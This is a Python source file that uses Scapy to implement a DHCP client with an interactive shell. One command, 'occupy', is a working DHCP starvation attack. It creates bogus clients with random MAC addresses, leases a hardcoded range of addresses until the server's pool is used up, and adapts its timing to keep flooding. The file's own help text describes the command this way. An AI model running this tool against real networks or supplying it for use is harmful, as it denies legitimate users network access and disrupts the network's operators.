#dhcp_client.py
from scapy.all import *
from time import *
import cmd



class dhcp_client:
	def __init__(self,
				 mac_address='',
				 ip_address='',
				 target_server=''):

		self.broadcast_mac_address = 'ff:ff:ff:ff:ff:ff'
		self.broadcast_ip_address = '255.255.255.255'
		self.null_ip_address = '0.0.0.0'
		self.dhcp_server_port = 67
		self.dhcp_client_port = 68

		mac_address = str(mac_address)
		self.state = 'init'
		self.mac = mac_address
		self.readable_mac = ':'.join(["%02X" %ord(x) for x in self.mac])
		self.ip = ip_address
		self.xid = 0
		self.offers	= [] 
		self.lease_time = 0 
		self.dhcp_server_ip = self.null_ip_address
		self.dns_server_ip = self.null_ip_address
		self.gateway_ip = self.null_ip_address
		self.subnet_mask = self.null_ip_address

		self.target	= target_server



	def send_discover_message(self):
		self.xid = get_transaction_id()
		conf.checkIPaddr = False

		ethernet = Ether(dst=self.broadcast_mac_address,
				 src=self.mac,
				 type=0x0800)

		ip = IP(src=self.null_ip_address,
			dst=self.broadcast_ip_address)

		udp = UDP(sport=self.dhcp_client_port,
			  dport=self.dhcp_server_port)

		bootp = BOOTP(op=1, htype=1, hlen=6, hops=0,
				xid=self.xid,
				secs=0, flags=0x0000, 
				ciaddr=self.null_ip_address, 
				yiaddr=self.null_ip_address, 
				siaddr=self.null_ip_address,
				giaddr=self.null_ip_address, 
				chaddr=self.mac)

		if(len(self.ip)>0):
			dhcp = DHCP(options=[("message-type","discover"),
					     ("requested_addr",self.ip),
					     ("end")])
		else:
			dhcp = DHCP(options=[("message-type","discover"),
					     ("end")])
	
		packet = ethernet / ip / udp / bootp / dhcp
		print('MAC={0} ==> Asking={1}'.format(self.readable_mac,self.ip))
		
		answered,unanswered=srp(packet,
					inter=0,
					multi=0,
					timeout=global_timeout,
					retry=0,
					verbose=0)
		
		return answered


	def handle_offer_messages(self, offers):
		self.state = 'selecting'
		for message in offers:
			server_xid = message[1][BOOTP].xid
			if(server_xid == self.xid):
				options = message[1][DHCP].options
				message_type = [item[1] for item in options if item[0] == "message-type"][0]
				if(message_type == 2):
					server_id = [item[1] for item in options if item[0] == "server_id"][0]
					lease_time = [item[1] for item in options if item[0] == "lease_time"][0]
					server_offer = message[1][BOOTP].yiaddr
				
					offer = '{0},{1},{2}'.format(server_id,lease_time,server_offer)
					self.offers.append(offer)
		
		if self.ip == 0:
			return 0
		elif self.ip > 0:
			if len(offers) > 1:
				for i in range(0,len(offers)):
					if offers[i][2]==self.ip:
						return i
					else:
						return 0
			else:
				return 0
			
				


	def send_request_message(self,selected_offer = 0):
		self.state = 'requesting'
		lease_parameters = self.offers[selected_offer].split(',')
		server_ip = lease_parameters[0]
		lease_time = lease_parameters[1]
		lease_ip = lease_parameters[2]
		
		conf.checkIPaddr = False

		ethernet = Ether(dst=self.broadcast_mac_address, src=self.mac, type=0x0800)

		ip = IP(src=self.null_ip_address, dst=self.broadcast_ip_address)

		udp = UDP(sport=self.dhcp_client_port, dport=self.dhcp_server_port)

		bootp = BOOTP(op=1, htype=1, hlen=6, hops=0,
				xid=self.xid,
				secs=0, flags=0x0000, 
				ciaddr=self.null_ip_address, 
				yiaddr=self.null_ip_address, 
				siaddr=self.null_ip_address,
				giaddr=self.null_ip_address, 
				chaddr=self.mac)
		
		dhcp = DHCP(options=[("message-type","request"),
							("requested_addr",lease_ip),
							("server_id",server_ip),
							("end")])
	
		packet = ethernet / ip / udp / bootp / dhcp
		print('Requesting={0}'.format(lease_ip))
		answered,unanswered=srp(packet,
					inter=0,
					multi=0,
					timeout=global_timeout,
					retry=0,
					verbose=0)

		self.ip = lease_ip
	
		return answered


	def handle_ack_or_nak_message(self, ack_or_nak):
		for message in ack_or_nak:
			options = message[1][DHCP].options
			for elements0 in options:
				if elements0[0] == "message-type":
					message = elements0[1]
					if message == 5:
						print('ACK...')
						for elements1 in options: 
							if elements1[0] == "lease_time":
								self.lease_time = elements1[1]
							if elements1[0] == "server_id":
								self.dhcp_server_ip = elements1[1]
							if elements1[0] == "name_server":
								self.dns_server_ip = elements1[1]
							if elements1[0] == "router":
								self.gateway_ip = elements1[1]
							if elements1[0] == "subnet_mask":
								self.subnet_mask = elements1[1]
						return 1
					elif message == 6:
						return 0
					else:
						return 0


	def send_inform_message(self):
		self.xid = get_transaction_id()
		conf.checkIPaddr = False

		ethernet = Ether(dst=self.broadcast_mac_address,
				 src=self.mac,
				 type=0x0800)

		ip = IP(src=self.null_ip_address,
			dst=self.broadcast_ip_address)

		udp = UDP(sport=self.dhcp_client_port,
			  dport=self.dhcp_server_port)

		bootp = BOOTP(op=1, htype=1, hlen=6, hops=0,
				xid=self.xid,
				secs=0, flags=0x0000, 
				ciaddr=self.ip, 
				yiaddr=self.null_ip_address, 
				siaddr=self.null_ip_address,
				giaddr=self.null_ip_address, 
				chaddr=self.mac)

		dhcp = DHCP(options=[("message-type","inform"),
					     ("end")])
	
		packet = ethernet / ip / udp / bootp / dhcp
		print('Sending Inform Message to Server...')
		
		answered,unanswered=srp(packet,
					inter=0,
					multi=0,
					timeout=global_timeout,
					retry=0,
					verbose=0)
		
		return answered




def get_transaction_id():
	prefix = '0x'
	transaction_id = RandString(8, '0123456789abcdef')
	transaction_id = int(prefix + str(transaction_id), 16)

	return transaction_id


def get_interface_mac_address(interface):
	fam, interface_mac_address = get_if_raw_hwaddr(interface)

	return interface_mac_address





def inform(hardware_address,network_address):
	hardware_address = hardware_address.replace(':','').decode('hex')
	client = dhcp_client(hardware_address,network_address)

	ack_or_nak = client.send_inform_message()
	if ack_or_nak:
		c = client.handle_ack_or_nak_message(ack_or_nak)
		if c == 1:
			print('\n'.join(['MAC        : {0}'.format(client.readable_mac),
				'IP         : {0}'.format(client.ip),
				'Lease Time : {0}'.format(client.lease_time),
				'DHCP       : {0}'.format(client.dhcp_server_ip),
				'DNS        : {0}'.format(client.dns_server_ip),
				'Gateway    : {0}'.format(client.gateway_ip),
				'Subnet     : {0}'.format(client.subnet_mask)]))
			
			return 1
	return 0

def bind(client):
	offers = client.send_discover_message()

	if offers:
		offer = client.handle_offer_messages(offers)
	else:
		client.state = 'init'
		print('No Reply...')
		return 0
	
	ack_or_nak = client.send_request_message(offer)

	if ack_or_nak:
		c = client.handle_ack_or_nak_message(ack_or_nak)
		if c == 1:
			client.state = 'bound'
		else:
			client.state = 'init'
	else:
		client.state = 'init'
		print('No Reply...')
		return 0

	if client.state == 'bound':
		print('Bound...')
		return 1
	else:
		return 0

def backoff():
	global global_timeout
	global_timeout = global_timeout*2
	if global_timeout > 2:
		global_timeout = 2

def flood():
	global global_timeout 
	global_timeout = global_timeout/2
	if global_timeout < .5:
		global_timeout = .5

def timeout():
	sleep(5)

def occupy(target_ips, rewrite):
	if rewrite == '1':
		dhcp_parameters = open('logistics.txt', 'w')
		dhcp_parameters.close()

	unbound_ips = []
	for i in target_ips:
		unbound_ips.append(i.strip())

	while(len(unbound_ips) > 0):
		bogus_clients = []
		bound_macs = []
		bound_ips = []

		logistics = open('logistics.txt','r')
		for line in logistics:
			data=line.split(',')
			bound_macs.append(data[0])
			bound_ips.append(data[1])
		logistics.close()	

		for ip in bound_ips:
			try:
				unbound_ips.remove(ip)
			except:
				continue

		for i in unbound_ips:
			rand_mac = RandMAC()._fix()
			while rand_mac in bound_macs:
				rand_mac = RandMAC()._fix()
			requested_ip = i
			
			rand_mac = rand_mac.replace(':','').decode('hex')
			malclient=dhcp_client(mac_address=rand_mac,ip_address = requested_ip)
			bogus_clients.append(malclient)

		no_reply = 0
		success = 0
		for client in bogus_clients:
			
			if no_reply == 5:
				backoff()
			if no_reply == 10:
				timeout()
				no_reply = 0
			if success == 2:
				flood()
				success = 0
			
			attempts = 0
			while(client.state != 'bound'):
				print('\n')		
				bind(client)
				if client.state == 'bound':
					print('{0} Unbound...'.format(len(unbound_ips)-1))
					success += 1
					no_reply = 0
					bound_macs.append(client.mac)	
					unbound_ips.remove(client.ip)
					line = []
					line.append(str(client.readable_mac))
					line.append(str(client.ip))
					line.append(str(time()))
					line.append(str(client.lease_time))
					line.append(str(client.dhcp_server_ip))
					line.append(str(client.dns_server_ip))
					line.append(str(client.gateway_ip))
					line.append(str(client.subnet_mask))
					stringline = ','.join(line) + '\n'
					dhcp_parameters = open('logistics.txt', 'a')
					dhcp_parameters.write(stringline)
					dhcp_parameters.close()
				else:
					attempts += 1
				if attempts == 1: 
					no_reply += 1
					success = 0
					break


def configure(interface='',ip=''):
	if interface == '':
		fam,hw=get_if_raw_hwaddr(conf.iface)
		interface = hw
	mac = get_interface_mac_address(interface)
	
	me = dhcp_client(mac_address = mac,ip_address = ip)
	if bind(me) == 1:
		line = []
		line.append(str(me.readable_mac))
		line.append(str(me.ip))
		line.append(str(time()))
		line.append(str(me.lease_time))
		line.append(str(me.dhcp_server_ip))
		line.append(str(me.dns_server_ip))
		line.append(str(me.gateway_ip))
		line.append(str(me.subnet_mask))
		stringline = ','.join(line)
		dhcp_parameters = open('config.txt', 'w')
		dhcp_parameters.write(stringline)
		dhcp_parameters.close()

		return 1
	
	else:

		return 0


class dhcp_client_shell(cmd.Cmd):
	prompt = '(dhcp)> '
	intro = '\nType "q" to exit.'

	def do_q(self, line):
		exit()
	
	def do_configure(self, line):
		args = line.split(' ')
		if len(args) == 2:	
			interface = args[0]
			ip = args[1]
		elif len(args) == 1:
			interface = args[0]
			ip = ''
		elif len(args) == 0:
			interface = ''
			ip = '' 			
		else:
			print('See help')
			return 0
		configured = 0
		while(configured == 0):
			configured = configure(interface,ip)

	def help_configure(self):
		print('\n'.join(['configure [interface] [address]']))

	def do_lease(self, line):
		lease_info = open('config.txt','r')
		data=lease_info.readline()
		lease_info.close() 		
		if len(data)==0:
			print('You must bind your hardware first.')
			return
		else:
			data = data.split(',')
			print('\n'.join(['MAC:       {0}'.format(data[0]),
							'IP:        {0}'.format(data[1]),
							'Lease Get: {0}'.format(data[2]),
							'Duration:  {0}'.format(data[3]),
							'DHCP:      {0}'.format(data[4]),
							'DNS:       {0}'.format(data[5]),
							'Gateway:   {0}'.format(data[6]),
							'Subnet:    {0}'.format(data[7])]))

	def help_lease(self):
		print('\n'.join(['lease','displays the lease parameters']))


	def do_occupy(self, line):
		# runs a DHCP Starvation Attack on a set of IPs
		# occupy [rewrite]
		
		args = line.split(' ')
		if len(args) > 1:
			print('See help.')
			return 
		elif len(args) == 1:
			rewrite_bit = args[0]
		elif len(args) == 0:
			rewrite_bit = 0

		ips='server.resource.txt'
		try:
			f = open(ips, 'r')
		except IOError:
			print('No Such File Exists.  See help.')
			return
		targets=[]
		for ip in f:
			targets.append(ip)
		f.close()

		print(rewrite_bit)
		occupy(targets,rewrite_bit)

	def help_occupy(self):
		print('\n'.join(['occupy [rewrite]', 'runs a dhcp starvation attack', 'uses server.resource.txt file', '[rewrite] if set rewriets the logistics.txt file.'])) 

	def do_inform(self,line):
		# inform 

		f = open('config.txt', 'r')
		data = f.readline()
		f.close()
		if len(data) == 0:
			print('You have no configuration parameters...')
			return 
		data = data.split(',')
			
		inform(data[0],data[1])
	
	def help_inform(self):
		print('\n'.join(['inform','sends an inform message for your configured interface']))
			



if __name__=='__main__':
	global_timeout = .5
	
	f = open('server.resource.txt','w')
	for i in range(100,201,1):
		f.write('10.10.111.{0}\n'.format(i))
	f.close()
	
	dhcp_client_shell().cmdloop()


